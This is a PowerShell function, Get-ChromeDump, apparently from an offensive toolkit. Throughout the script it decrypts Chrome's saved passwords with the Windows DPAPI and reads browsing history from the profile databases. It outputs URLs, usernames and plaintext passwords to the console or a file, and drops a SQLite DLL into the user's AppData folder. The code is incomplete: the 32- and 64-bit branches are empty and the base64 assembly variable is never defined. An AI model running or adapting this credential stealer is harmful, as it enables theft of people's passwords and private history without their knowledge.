Function Get-ChromeDump{

  <#
  .SYNOPSIS
  This function returns any passwords and history stored in the chrome sqlite databases.

  .DESCRIPTION
  This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
  cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

  .PARAMETER OutFile
  Switch to dump all results out to a file.

  .EXAMPLE

  Get-ChromeDump -OutFile "$env:HOMEPATH\chromepwds.txt"

  Dump All chrome passwords and history to the specified file

  .LINK
  http://www.xorrior.com

  #>

  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile
  )
    #Add the required assembly for decryption

    Add-Type -Assembly System.Security

    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }

    if([IntPtr]::Size -eq 8)
    {
        #64 bit version
    }
    else
    {
        #32 bit version

    }
    #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
    #DLL for sqlite queries and parsing
    #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"


    $content = [System.Convert]::FromBase64String($assembly)



    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll"


    if(Test-path $assemblyPath)
    {
      try
      {
        Add-Type -Path $assemblyPath
      }
      catch
      {
        Write-Warning "Unable to load SQLite assembly"
        break
      }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try
        {
            Add-Type -Path $assemblyPath
        }
        catch
        {
            Write-Warning "Unable to load SQLite assembly"
            break
        }
    }

    #Check if Chrome is running. The data files are locked while Chrome is running

    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
      Write-Warning "[+]Cannot parse Data files while chrome is running"
      break
    }

    #grab the path to Chrome user data
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }

    if(!(Test-path $chromepath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      #DB for CC and other info
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      #DB for passwords
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      #DB for history
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
      #$cookiesdb = "$chromepath\Cookies"

    }

    if(!($NoPasswords)){

      #Parse the login data DB
      $connStr = "Data Source=$loginDatadb; Read Only=True; Version=3;"

      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

      $OpenConnection = $connection.OpenAndReturn()

      Write-Verbose "Opened DB file $loginDatadb"

      $query = "SELECT * FROM logins;"

      $dataset = New-Object System.Data.DataSet

      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

      [void]$dataAdapter.fill($dataset)

      $logins = @()

      Write-Verbose "Parsing results of query $query"

      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytes = $_.password_value
        $username = $_.username_value
        $url = $_.action_url
        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
        $login = New-Object PSObject -Property @{
          URL = $url
          PWD = $plaintext
          User = $username
        }

        $logins += $login
      }
    }

    #Parse the History DB
    $connString = "Data Source=$historydb; Version=3;"

    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

    $Open = $connection.OpenAndReturn()

    Write-Verbose "Opened DB file $historydb"

    $DataSet = New-Object System.Data.DataSet

    $query = "SELECT * FROM urls;"

    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

    [void]$dataAdapter.fill($DataSet)

    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title
        URL = $_.url
      }
      $History += $HistoryInfo
    }

    if(!($OutFile)){
      "[*]CHROME PASSWORDS`n"
      $logins | Format-Table URL,User,PWD -AutoSize

      #"[*]CHROME HISTORY`n"

      #$History | Format-List Title,URL
    }
    else {
        "[*]LOGINS`n" | Out-File $OutFile
        $logins | Out-File $OutFile -Append

        #"[*]HISTORY`n" | Out-File $OutFile -Append
        #$History | Out-File $OutFile -Append

    }


    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"



}